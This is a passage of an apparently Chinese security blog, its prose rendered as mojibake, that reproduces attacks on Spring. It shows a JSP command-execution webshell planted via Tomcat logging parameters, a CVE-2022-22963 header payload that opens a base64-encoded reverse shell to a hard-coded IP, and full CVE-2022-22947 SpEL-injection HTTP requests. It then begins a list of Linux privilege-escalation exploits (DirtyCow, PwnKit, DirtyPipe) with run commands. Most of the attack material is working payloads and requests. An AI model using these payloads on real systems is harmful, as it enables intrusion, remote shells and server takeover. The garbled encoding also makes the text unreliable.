<h4 id="å†™shell"><a href="#å†™shell" class="headerlink" title="å†™shell"></a>å†™shell</h4><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">urlç¼–ç å‰çš„webshellï¼š
<span class="token operator">%</span><span class="token punctuation">&#123;</span>c2<span class="token punctuation">&#125;</span>i <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"t"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"pwd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream <span class="token keyword">in</span> <span class="token operator">=</span> <span class="token operator">%</span><span class="token punctuation">&#123;</span>c1<span class="token punctuation">&#125;</span>i<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> int a <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> byte<span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token number">2048</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">=</span><span class="token keyword">in</span><span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token operator">%</span><span class="token punctuation">&#123;</span>suffix<span class="token punctuation">&#125;</span>i

urlç¼–ç åçš„webshellï¼š
<span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span>7Bc2<span class="token operator">%</span>7Di<span class="token operator">%</span><span class="token number">20</span><span class="token function">if</span><span class="token punctuation">(</span><span class="token operator">%</span>22t<span class="token operator">%</span><span class="token number">22.</span><span class="token function">equals</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token operator">%</span>22pwd<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>7B<span class="token operator">%</span>20java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream<span class="token operator">%</span>20in<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>3D<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span>7Bc1<span class="token operator">%</span>7Di<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token operator">%</span>22cmd<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span>3B<span class="token operator">%</span>20int<span class="token operator">%</span>20a<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>3D<span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span>3B<span class="token operator">%</span>20byte<span class="token operator">%</span>5B<span class="token operator">%</span>5D<span class="token operator">%</span>20b<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>3D<span class="token operator">%</span>20new<span class="token operator">%</span>20byte<span class="token operator">%</span>5B2048<span class="token operator">%</span>5D<span class="token operator">%</span>3B<span class="token operator">%</span><span class="token number">20</span><span class="token function">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">%</span>3Din<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!</span><span class="token operator">%</span>3D<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span>7B<span class="token operator">%</span>20out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span><span class="token operator">%</span><span class="token number">20</span><span class="token function">String</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>3B<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>7D<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>7D<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span>7Bsuffix<span class="token operator">%</span>7Di<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æ‰€ä»¥ç°åœ¨åªéœ€è¦æŠŠshell.jspçš„å†…å®¹æ¢æˆä¸‹é¢çš„</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">class</span><span class="token punctuation">.</span>module<span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span>resources<span class="token punctuation">.</span>context<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>pipeline<span class="token punctuation">.</span>first<span class="token punctuation">.</span>pattern<span class="token operator">=</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span>7Bc2<span class="token operator">%</span>7Di<span class="token operator">%</span><span class="token number">20</span><span class="token function">if</span><span class="token punctuation">(</span><span class="token operator">%</span>22t<span class="token operator">%</span><span class="token number">22.</span><span class="token function">equals</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token operator">%</span>22pwd<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>7B<span class="token operator">%</span>20java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream<span class="token operator">%</span>20in<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>3D<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span>7Bc1<span class="token operator">%</span>7Di<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token operator">%</span>22cmd<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span>3B<span class="token operator">%</span>20int<span class="token operator">%</span>20a<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>3D<span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span>3B<span class="token operator">%</span>20byte<span class="token operator">%</span>5B<span class="token operator">%</span>5D<span class="token operator">%</span>20b<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>3D<span class="token operator">%</span>20new<span class="token operator">%</span>20byte<span class="token operator">%</span>5B2048<span class="token operator">%</span>5D<span class="token operator">%</span>3B<span class="token operator">%</span><span class="token number">20</span><span class="token function">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">%</span>3Din<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!</span><span class="token operator">%</span>3D<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span>7B<span class="token operator">%</span>20out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span><span class="token operator">%</span><span class="token number">20</span><span class="token function">String</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>3B<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>7D<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>7D<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span>7Bsuffix<span class="token operator">%</span>7Di
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>åŒæ—¶åœ¨è¯·æ±‚ä¸­éœ€è¦åŠ 3ä¸ªheader</p>
<blockquote>
<p>suffix:%&gt;&#x2F;&#x2F;<br>c1:Runtime<br>c2:&lt;%</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/direct/69c6d3cf3a1842fea05860500ed9a43d.png" alt="123"></p>
<h2 id="Spring-Cloud-Function-RCE-CVE-2022-22963"><a href="#Spring-Cloud-Function-RCE-CVE-2022-22963" class="headerlink" title="Spring Cloud Function RCE(CVE-2022-22963)"></a>Spring Cloud Function RCE(CVE-2022-22963)</h2><p>å½±å“ç‰ˆæœ¬ï¼š<br>3.0.0.RELEASE &lt;&#x3D; Spring Cloud Function &lt;&#x3D; 3.2.2</p>
<h3 id="æŒ‡çº¹"><a href="#æŒ‡çº¹" class="headerlink" title="æŒ‡çº¹"></a>æŒ‡çº¹</h3><p>&#x2F;functionRouter</p>
<h3 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><p>è®¿é—®&#x2F;functionRouter ä½¿ç”¨POSTå‘åŒ…ï¼Œç„¶ååœ¨headerå¤´é‡Œé¢æ”¾ç½®payload<br> <img src="https://img-blog.csdnimg.cn/direct/0c8b5bbb98174599a460796ee4795154.png" alt="456"><br><code>spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4xMDAuMTU0LzgwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)</code><br>ç„¶åæœåŠ¡å™¨ç›‘å¬ç«¯å£ï¼Œä¹‹åå‘åŒ…ï¼Œåå¼¹æˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/direct/b7db3a870b714466855430367b09815d.png" alt="123"></p>
<h2 id="Spring-Cloud-Gateway-RCE-CVE-2022-22947"><a href="#Spring-Cloud-Gateway-RCE-CVE-2022-22947" class="headerlink" title="Spring Cloud Gateway RCE(CVE-2022-22947)"></a>Spring Cloud Gateway RCE(CVE-2022-22947)</h2><p>è¿™ä¸ªæ´æœ‰ä¸¤ä¸ªå‰æ</p>
<ul>
<li>management.endpoint.gateway.enabled: true</li>
<li>management.endpoints.web.exposure.include: gateway</li>
</ul>
<p>å½±å“ç‰ˆæœ¬<br>pring Cloud Gateway 3.1.0 Spring Cloud Gateway 3.0.0 - 3.0.6 æ—§çš„ä¸å—æ”¯æŒçš„ç‰ˆæœ¬ä¹Ÿå—å½±å“</p>
<h3 id="æŒ‡çº¹-1"><a href="#æŒ‡çº¹-1" class="headerlink" title="æŒ‡çº¹"></a>æŒ‡çº¹</h3><p>å…ˆä»‹ç»ä¸€ä¸‹Spring cloud GateWayçš„actuatorç›¸å…³ç«¯ç‚¹</p>
<ul>
<li><p>è·å–æ‰€æœ‰è·¯ç”±ï¼šGetè¯·æ±‚ï¼š<code>http://localhost:xxxx/actuator/gateway/routes/</code></p>
</li>
<li><p>æ·»åŠ è·¯ç”±ï¼šPOSTè¯·æ±‚ï¼š<code>http://localhost:xxxx/actuator/gateway/routes/</code>è·¯ç”±ç¼–å·</p>
</li>
<li><p>åˆ é™¤è·¯ç”±ï¼šDELETEè¯·æ±‚ï¼š<code>http://localhost:xxxx/actuator/gateway/routes/</code>è·¯ç”±ç¼–å·</p>
</li>
<li><p>è·å–æŒ‡å®šè·¯ç”±ï¼šGETè¯·æ±‚ï¼š<code>http://localhost:xxxx/actuator/gateway/routes/</code>è·¯ç”±ç¼–å·</p>
</li>
<li><p>åˆ·æ–°è·¯ç”±ï¼šPOSTè¯·æ±‚ï¼š<code>http://localhost:xxxx/actuator/gateway/refresh</code></p>
</li>
</ul>
<p>å…¶ä¸­ï¼Œè°ƒç”¨æ·»åŠ è·¯ç”±çš„ç«¯ç‚¹æ—¶ï¼Œå¯ä»¥å‘è·¯ç”±ä¸­åŠ å…¥filtersï¼Œè¿‡æ»¤å™¨çš„å€¼å…è®¸ä¸ºspELè¡¨è¾¾å¼ï¼Œä¸”ä¼šè§£æè¿™ä¸ªspELè¡¨è¾¾å¼ã€‚å¯ä»¥é€šè¿‡æ„é€ spELè¿›è¡Œè¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ„é€ çš„filterså¯ä»¥ç›´æ¥åˆ©ç”¨gatewayè‡ªå¸¦çš„AddResponseHeaderï¼Œå°†spELçš„æ‰§è¡Œç»“æœæ·»åŠ åˆ°å“åº”å¤´ä¸­ï¼Œç›´æ¥é€šè¿‡å“åº”å¤´è¿›è¡ŒæŸ¥çœ‹</p>
<p>æ‰€ä»¥æŒ‡çº¹å°±å¾ˆæ¸…æ¥šäº†â€“&gt; &#x2F;actutor&#x2F;gateway</p>
<h3 id="æ¼æ´å¤ç°-6"><a href="#æ¼æ´å¤ç°-6" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>æ¼æ´åˆ©ç”¨è¿‡ç¨‹ä¸ºï¼šæ·»åŠ è·¯ç”±â€“&gt;è§¦å‘payloadâ€“&gt;æŸ¥çœ‹ç»“æœ å…¶æœ¬è´¨ä¸ºSpELè¡¨è¾¾å¼æ³¨å…¥ï¼Œåœ¨æ·»åŠ è·¯ç”±æ—¶çš„valueå¤„æ’å…¥è¡¨è¾¾å¼å³å¯</p>
<h4 id="æ·»åŠ è·¯ç”±"><a href="#æ·»åŠ è·¯ç”±" class="headerlink" title="æ·»åŠ è·¯ç”±"></a>æ·»åŠ è·¯ç”±</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/actuator/gateway/routes/milu</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span><span class="token header-value">x.x.x.x:8080</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">*/*</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/json</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">329</span></span>
<span class="token application-json">
<span class="token punctuation">&#123;</span>
  <span class="token property">"id"</span><span class="token operator">:</span> <span class="token string">"hacktest"</span><span class="token punctuation">,</span>
  <span class="token property">"filters"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span>
    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"AddResponseHeader"</span><span class="token punctuation">,</span>
    <span class="token property">"args"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
      <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"Result"</span><span class="token punctuation">,</span>
      <span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\"id\"&#125;).getInputStream()))&#125;"</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token property">"uri"</span><span class="token operator">:</span> <span class="token string">"http://example.com"</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>alueâ€: â€œ#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{&quot;id&quot;}).getInputStream()))}â€</p>
<p>è¿™é‡Œfiltersé‡Œçš„nameå¯ä»¥ä»»æ„ä¿®æ”¹ä¸ºä¸‹é¢çš„å†…å®¹</p>
<blockquote>
<p>#è¿‡æ»¤å™¨ä½¿ç”¨è¯´æ˜<br><a href="https://docs.spring.io/spring-cloud-gateway/docs/current/reference/html/#the-addrequestheader-gatewayfilter-factory">https://docs.spring.io/spring-cloud-gateway/docs/current/reference/html/#the-addrequestheader-gatewayfilter-factory</a></p>
</blockquote>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">AddRequestHeader
MapRequestHeader
AddRequestParameter
AddResponseHeader
ModifyRequestBody
DedupeResponseHeader
ModifyResponseBody
CacheRequestBody
PrefixPath
PreserveHostHeader
RedirectTo
RemoveRequestHeader
RemoveRequestParameter
RemoveResponseHeader
RewritePath
Retry
SetPath
SecureHeaders
SetRequestHeader
SetRequestHostHeader
RewriteResponseHeader
RewriteLocationResponseHeader
SetStatus
SaveSession
StripPrefix
RequestHeaderToRequestUri
RequestSize
RequestHeaderSize<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="è§¦å‘payload"><a href="#è§¦å‘payload" class="headerlink" title="è§¦å‘payload"></a>è§¦å‘payload</h4><pre class="line-numbers language-text" data-language="text"><code class="language-text">POST /actuator/gateway/refresh HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="æŸ¥çœ‹ç»“æœ"><a href="#æŸ¥çœ‹ç»“æœ" class="headerlink" title="æŸ¥çœ‹ç»“æœ"></a>æŸ¥çœ‹ç»“æœ</h4><p>è®¿é—® â€“&gt; &#x2F;actuator&#x2F;gateway&#x2F;routes&#x2F;milu<br><img src="https://img-blog.csdnimg.cn/direct/67419cadda4d4a619e3e40003754c522.png" alt="123"></p>
<h4 id="åˆ é™¤è·¯ç”±"><a href="#åˆ é™¤è·¯ç”±" class="headerlink" title="åˆ é™¤è·¯ç”±"></a>åˆ é™¤è·¯ç”±</h4><pre class="line-numbers language-text" data-language="text"><code class="language-text">
DELETE /actuator/gateway/routes/milu HTTP/1.1
Host: 192.168.32.130:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="åˆ·æ–°è·¯ç”±"><a href="#åˆ·æ–°è·¯ç”±" class="headerlink" title="åˆ·æ–°è·¯ç”±"></a>åˆ·æ–°è·¯ç”±</h4><pre class="line-numbers language-text" data-language="text"><code class="language-text">
POST /actuator/gateway/refresh HTTP/1.1
Host: 192.168.32.130:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0


<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://mp.weixin.qq.com/s/ZwTjUv7jemN7BWx72R9B-A">ä»0è®¤è¯†+è¯†åˆ«+æŒæ¡springå…¨æ¼æ´(1.8wå­—è¶…è¯¦ç»†çœ‹å®Œæ‹¿æspring)</a></p>
]]></content>
      <categories>
        <category>æ¼æ´å¤ç°</category>
      </categories>
      <tags>
        <tag>å¤ç°</tag>
      </tags>
  </entry>
  <entry>
    <title>117ç§ææƒæ‰‹æ³•</title>
    <url>/2023/11/17/117%E7%A7%8D%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="ä»€ä¹ˆæ˜¯ç½‘ç»œå®‰å…¨ä¸­çš„æƒé™æå‡ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯ç½‘ç»œå®‰å…¨ä¸­çš„æƒé™æå‡ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ç½‘ç»œå®‰å…¨ä¸­çš„æƒé™æå‡ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ç½‘ç»œå®‰å…¨ä¸­çš„æƒé™æå‡ï¼Ÿ</h1><p>åœ¨ç½‘ç»œå®‰å…¨é¢†åŸŸï¼Œäº†è§£å¨èƒè‡³å…³é‡è¦ï¼Œè€Œæœ€å…³é”®çš„å¨èƒä¹‹ä¸€å°±æ˜¯ç‰¹æƒå‡çº§çš„æ¦‚å¿µã€‚ä»æœ¬è´¨ä¸Šè®²ï¼Œæƒé™å‡çº§æ˜¯æŒ‡æ”»å‡»è€…è·å¾—é€šå¸¸ä¸ºé«˜çº§ç”¨æˆ·ä¿ç•™çš„ç³»ç»Ÿæƒé™æˆ–åŠŸèƒ½çš„æƒ…å†µã€‚</p>
<p>ä¸»è¦æœ‰ä¸¤ç§ç±»å‹ï¼šå‚ç›´å‡çº§å’Œæ°´å¹³å‡çº§ã€‚åœ¨å‚ç›´å‡çº§ä¸­ï¼Œå…·æœ‰è¾ƒä½çº§åˆ«æƒé™çš„æ”»å‡»è€…å°†å…¶æƒé™æå‡åˆ°è¾ƒé«˜çº§åˆ«ç”¨æˆ·ï¼ˆé€šå¸¸æ˜¯ç®¡ç†å‘˜ï¼‰çš„æƒé™ã€‚è¿™ä½¿å¾—ä»–ä»¬èƒ½å¤Ÿè®¿é—®å—é™åŒºåŸŸã€ä¿®æ”¹ç³»ç»Ÿé…ç½®ï¼Œç”šè‡³éƒ¨ç½²æ¶æ„è½¯ä»¶ã€‚å¦ä¸€æ–¹é¢ï¼Œæ¨ªå‘å‡çº§æ¶‰åŠè®¿é—®å±äºå¯¹ç­‰ç”¨æˆ·çš„èµ„æºæˆ–åŠŸèƒ½ï¼Œå¹¶åˆ©ç”¨ç±»ä¼¼ç‰¹æƒå¸æˆ·çš„æƒé™ã€‚</p>
<p>ç‰¹æƒå‡çº§çš„å±é™©æ˜¯æ˜¾è€Œæ˜“è§çš„ã€‚é€šè¿‡æå‡æƒé™ï¼Œæ”»å‡»è€…å¯ä»¥ç»•è¿‡ç½‘ç»œå®‰å…¨æªæ–½ï¼Œä»è€ŒæŸå®³æ•°æ®å®Œæ•´æ€§ã€æœºå¯†æ€§å’Œç³»ç»Ÿå¯ç”¨æ€§ã€‚å¯¹äºç»„ç»‡è€Œè¨€ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´æ•°æ®æ³„éœ²ã€ç³»ç»Ÿåœæœºä»¥åŠæ½œåœ¨çš„æ³•å¾‹å’Œå£°èª‰åæœã€‚è¯†åˆ«æƒé™å‡çº§çš„è¿¹è±¡å¹¶éƒ¨ç½²é¢„é˜²æ€§ç½‘ç»œå®‰å…¨æªæ–½å¯¹äºä¿æŠ¤æ•°å­—èµ„äº§å¹¶ç¡®ä¿åªæœ‰æˆæƒäººå‘˜æ‰èƒ½è®¿é—®å…³é”®ç³»ç»ŸåŠŸèƒ½è‡³å…³é‡è¦ã€‚</p>
<p>é‰´äºç½‘ç»œå®‰å…¨ä¸æ–­å‘å±•çš„å½¢åŠ¿ï¼Œå¯¹ç‰¹æƒå‡çº§ç­‰å¨èƒä¿æŒè­¦æƒ•è‡³å…³é‡è¦ã€‚å®ƒå¼ºè°ƒäº†ä¸æ–­æ›´æ–°å®‰å…¨åè®®ã€ç›‘æ§ç³»ç»Ÿæ´»åŠ¨ä»¥åŠç¡®ä¿æ­£ç¡®åˆ†é…å’Œå®šæœŸå®¡æ ¸ç”¨æˆ·è§’è‰²å’Œæƒé™çš„é‡è¦æ€§ã€‚è¿™æ ·åšï¼Œç»„ç»‡å¯ä»¥å‡è½»ä¸æœªç»æˆæƒçš„è®¿é—®ç›¸å…³çš„é£é™©ï¼Œå¹¶ä¿æŒå¯¹æ½œåœ¨ç½‘ç»œå¯¹æ‰‹çš„å¼ºå¤§é˜²å¾¡ã€‚</p>
<p>ç°åœ¨æˆ‘ä»¬å·²ç»ç†Ÿæ‚‰äº†è¿™ä¸ªæ¦‚å¿µï¼Œæˆ‘ä»¬å°†ç»§ç»­ç ”ç©¶è¿™ä¸ªææƒæ¦‚å¿µçš„117ç§æ–¹æ³•ï¼š</p>
<h1 id="117ç§ææƒæ‰‹æ³•"><a href="#117ç§ææƒæ‰‹æ³•" class="headerlink" title="117ç§ææƒæ‰‹æ³•"></a>117ç§ææƒæ‰‹æ³•</h1><h3 id="DirtyC0w"><a href="#DirtyC0w" class="headerlink" title="DirtyC0w"></a>DirtyC0w</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Linux</p>
<p>ç±»å‹:  0&#x2F;1 Exploit</p>
<p>æ–¹æ³•: <code>gcc -pthread c0w.c -o c0w; ./c0w; passwd; id</code></p>
<p>æ‰¹æ³¨ï¼š<a href="https://github.com/firefart/dirtycow">https://github.com/firefart/dirtycow</a></p>
<h3 id="CVE-2016-1531"><a href="#CVE-2016-1531" class="headerlink" title="CVE-2016-1531"></a>CVE-2016-1531</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Linux</p>
<p>ç±»å‹:  0&#x2F;1 Exploit</p>
<p>æ–¹æ³•: <code>CVE-2016-1531.sh;id</code></p>
<p>æ‰¹æ³¨ï¼š<a href="https://github.com/crypticdante/CVE-2016-1531">https://github.com/crypticdante/CVE-2016-1531</a></p>
<h3 id="Polkit"><a href="#Polkit" class="headerlink" title="Polkit"></a>Polkit</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Linux</p>
<p>ç±»å‹:  0&#x2F;1 Exploit</p>
<p>æ–¹æ³•:</p>
<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;secnigma&#x2F;CVE-2021-3560-Polkit-Privilege-Esclation
.&#x2F;2. poc.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="DirtyPipe"><a href="#DirtyPipe" class="headerlink" title="DirtyPipe"></a>DirtyPipe</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Linux</p>
<p>ç±»å‹:  0&#x2F;1 Exploit</p>
<p>æ–¹æ³•: </p>
<ol>
<li><code>./traitor-amd64 â€“exploit kernel:CVE-2022-0847</code></li>
<li><code>Whoami;id</code></li>
</ol>
<p>æ‰¹æ³¨ï¼š<a href="https://github.com/liamg/traitor/releases/tag/v0.0.14">https://github.com/liamg/traitor/releases/tag/v0.0.14</a></p>
<h3 id="PwnKit"><a href="#PwnKit" class="headerlink" title="PwnKit"></a>PwnKit</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Linux</p>
<p>ç±»å‹:  0&#x2F;1 Exploit</p>
<p>æ–¹æ³•: </p>
<ol>
<li><code>./cve-2021-4034</code></li>
<li><code>Whoami;id</code></li>
</ol>
<p>æ‰¹æ³¨ï¼š<a href="https://github.com/berdav/CVE-2021-4034">https://github.com/berdav/CVE-2021-4034</a></p>
